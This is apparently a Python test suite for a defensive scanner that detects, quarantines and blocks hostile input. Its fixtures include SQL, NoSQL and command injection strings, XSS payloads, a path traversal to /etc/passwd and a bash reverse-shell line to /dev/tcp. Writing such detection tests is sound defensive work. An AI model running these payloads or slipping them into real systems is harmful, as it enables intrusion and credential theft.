"""
Tests for The Ice Box — ThreatAnalyser, SignatureLibrary, QuarantineStore,
and WarpTunnel routing layer.
"""

from __future__ import annotations

import os
import tempfile
from pathlib import Path

import pytest

os.environ.setdefault("SECRET_KEY", "ice-box-test-secret-key-at-least-32chars!")

from src.security.ice_box.analyser import ThreatAnalyser, ThreatFinding, ThreatVerdict
from src.security.ice_box.quarantine import QuarantineStore
from src.security.ice_box.signatures import SignatureLibrary, ThreatCategory, get_library
from src.security.warp_tunnel.tunnel import TunnelConfig, WarpTunnel


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def analyser():
    return ThreatAnalyser()


@pytest.fixture()
def tmp_quarantine(tmp_path):
    return QuarantineStore(tmp_path / "quarantine.db")


@pytest.fixture()
def tunnel(tmp_path):
    cfg = TunnelConfig(quarantine_db=str(tmp_path / "q.db"), strict_mode=False)
    return WarpTunnel(cfg)


@pytest.fixture()
def strict_tunnel(tmp_path):
    cfg = TunnelConfig(quarantine_db=str(tmp_path / "q.db"), strict_mode=True)
    return WarpTunnel(cfg)


# ---------------------------------------------------------------------------
# SignatureLibrary
# ---------------------------------------------------------------------------


def test_library_loads_signatures():
    lib = get_library()
    assert len(lib) > 20


def test_library_singleton():
    assert get_library() is get_library()


def test_scan_clean_content():
    lib = get_library()
    assert lib.scan("hello world, this is a normal sentence") == []


def test_scan_sql_injection():
    lib = get_library()
    findings = lib.scan("' OR 1=1 --")
    assert any(s.category == ThreatCategory.INJECTION for s in findings)


def test_scan_xss_script_tag():
    lib = get_library()
    findings = lib.scan('<script>alert("xss")</script>')
    assert any(s.category == ThreatCategory.XSS for s in findings)


def test_scan_path_traversal():
    lib = get_library()
    findings = lib.scan("../../etc/passwd")
    assert any(s.category == ThreatCategory.PATH_TRAVERSAL for s in findings)


def test_scan_aws_key():
    lib = get_library()
    findings = lib.scan("AKIAIOSFODNN7EXAMPLE1234")
    assert any(s.category == ThreatCategory.CREDENTIAL_LEAK for s in findings)


def test_scan_pem_key():
    lib = get_library()
    findings = lib.scan("-----BEGIN RSA PRIVATE KEY-----")
    assert any(s.category == ThreatCategory.CREDENTIAL_LEAK for s in findings)


def test_scan_nosql_injection():
    lib = get_library()
    findings = lib.scan('{"$where": "sleep(5000)"}')
    assert any(s.category == ThreatCategory.INJECTION for s in findings)


def test_scan_command_injection():
    lib = get_library()
    findings = lib.scan("$(cat /etc/passwd)")
    assert any(s.category == ThreatCategory.INJECTION for s in findings)


def test_scan_reverse_shell():
    lib = get_library()
    findings = lib.scan("bash -i >& /dev/tcp/10.0.0.1/4444")
    assert any(s.category == ThreatCategory.MALWARE for s in findings)


def test_scan_pickle_abuse():
    lib = get_library()
    findings = lib.scan("pickle.loads(data)")
    assert any(s.category == ThreatCategory.SUSPICIOUS_EXEC for s in findings)


def test_scan_returns_all_matching():
    lib = get_library()
    # Both XSS and injection in same payload
    findings = lib.scan('<script>alert(1)</script>; DROP TABLE users --')
    cats = {s.category for s in findings}
    assert ThreatCategory.XSS in cats
    assert ThreatCategory.INJECTION in cats


# ---------------------------------------------------------------------------
# ThreatAnalyser
# ---------------------------------------------------------------------------


def test_analyser_clean_returns_clean(analyser):
    report = analyser.analyse("Hello, I would like to order a pizza please.")
    assert report.verdict == ThreatVerdict.CLEAN
    assert report.findings == []


def test_analyser_sql_injection_malicious(analyser):
    report = analyser.analyse("admin' UNION SELECT * FROM users --")
    assert report.verdict == ThreatVerdict.MALICIOUS


def test_analyser_report_has_hash(analyser):
    report = analyser.analyse("test content")
    assert len(report.content_hash) == 64


def test_analyser_report_entropy(analyser):
    report = analyser.analyse("aaaaaaaaa")
    assert report.entropy < 1.0  # very low entropy for repetitive content


def test_analyser_report_timing(analyser):
    report = analyser.analyse("normal content")
    assert report.analysis_ms >= 0


def test_analyser_bytes_input(analyser):
    report = analyser.analyse(b"binary content \x00\x01\x02")
    assert report.content_length > 0


def test_analyser_mz_header_flagged(analyser):
    report = analyser.analyse(b"MZ\x90\x00" + b"\x00" * 100)
    assert report.suspicious_binary is True


def test_analyser_critical_count(analyser):
    report = analyser.analyse("admin' UNION SELECT null, null --")
    assert report.critical_count >= 1


def test_analyser_xss_verdict(analyser):
    report = analyser.analyse('<img src=x onerror=alert(1)>')
    assert report.verdict in (ThreatVerdict.MALICIOUS, ThreatVerdict.SUSPICIOUS)


# ---------------------------------------------------------------------------
# QuarantineStore
# ---------------------------------------------------------------------------


def test_quarantine_store_creates_db(tmp_path):
    q = QuarantineStore(tmp_path / "q.db")
    assert (tmp_path / "q.db").exists()


def test_quarantine_and_retrieve(analyser, tmp_quarantine):
    report = analyser.analyse("admin' UNION SELECT * FROM users --")
    qid = tmp_quarantine.quarantine(report, source="test")
    record = tmp_quarantine.get(qid)
    assert record is not None
    assert record.quarantine_id == qid
    assert record.source == "test"
    assert record.verdict == "malicious"


def test_quarantine_list_active(analyser, tmp_quarantine):
    for i in range(3):
        report = analyser.analyse(f"' OR {i}=1 --")
        tmp_quarantine.quarantine(report, source=f"test-{i}")
    active = tmp_quarantine.list_active()
    assert len(active) >= 3


def test_quarantine_release(analyser, tmp_quarantine):
    report = analyser.analyse("' OR 1=1 --")
    qid = tmp_quarantine.quarantine(report)
    ok = tmp_quarantine.release(qid, reason="false positive", reviewed_by="analyst")
    assert ok is True
    record = tmp_quarantine.get(qid)
    assert record.released_at is not None
    assert record.release_reason == "false positive"
    assert record.reviewed_by == "analyst"


def test_quarantine_release_already_released(analyser, tmp_quarantine):
    report = analyser.analyse("' OR 1=1 --")
    qid = tmp_quarantine.quarantine(report)
    tmp_quarantine.release(qid, reason="first")
    ok = tmp_quarantine.release(qid, reason="second")
    assert ok is False


def test_quarantine_stats(analyser, tmp_quarantine):
    report = analyser.analyse("' OR 1=1 --")
    tmp_quarantine.quarantine(report)
    stats = tmp_quarantine.stats()
    assert stats["total"] >= 1
    assert stats["active"] >= 1


def test_quarantine_get_by_hash(analyser, tmp_quarantine):
    report = analyser.analyse("' OR 1=1 --")
    qid = tmp_quarantine.quarantine(report)
    records = tmp_quarantine.get_by_hash(report.content_hash)
    assert any(r.quarantine_id == qid for r in records)


# ---------------------------------------------------------------------------
# WarpTunnel
# ---------------------------------------------------------------------------


def test_tunnel_allows_clean_content(tunnel):
    result = tunnel.scan("Hello world, this is a benign message.")
    assert result.allow is True
    assert result.verdict == ThreatVerdict.CLEAN


def test_tunnel_blocks_sql_injection(tunnel):
    result = tunnel.scan("admin' UNION SELECT * FROM passwords --")
    assert result.allow is False


def test_tunnel_blocks_xss(tunnel):
    result = tunnel.scan('<script>document.cookie</script>')
    assert result.allow is False


def test_tunnel_sets_quarantine_id_on_block(tunnel):
    result = tunnel.scan("admin' UNION SELECT * FROM users --")
    assert result.was_quarantined is True
    assert result.quarantine_id is not None


def test_tunnel_block_reason_contains_findings(tunnel):
    result = tunnel.scan("admin' UNION SELECT * FROM users --")
    assert "finding" in (result.block_reason or "").lower()


def test_tunnel_size_limit():
    cfg = TunnelConfig(max_content_bytes=10, quarantine_db=":memory:")
    with tempfile.TemporaryDirectory() as d:
        cfg.quarantine_db = str(Path(d) / "q.db")
        t = WarpTunnel(cfg)
        result = t.scan("x" * 100)
    assert result.allow is False
    assert "size" in (result.block_reason or "").lower()


def test_tunnel_strict_mode_blocks_suspicious(strict_tunnel):
    # In strict mode, even SUSPICIOUS content is blocked
    result = strict_tunnel.scan('<img src=x onerror="alert(1)">')
    assert result.allow is False


def test_tunnel_stats(tunnel):
    tunnel.scan("admin' UNION SELECT * FROM users --")
    stats = tunnel.quarantine_stats()
    assert stats["total"] >= 1


def test_tunnel_analysis_ms_populated(tunnel):
    result = tunnel.scan("hello world")
    assert result.analysis_ms >= 0
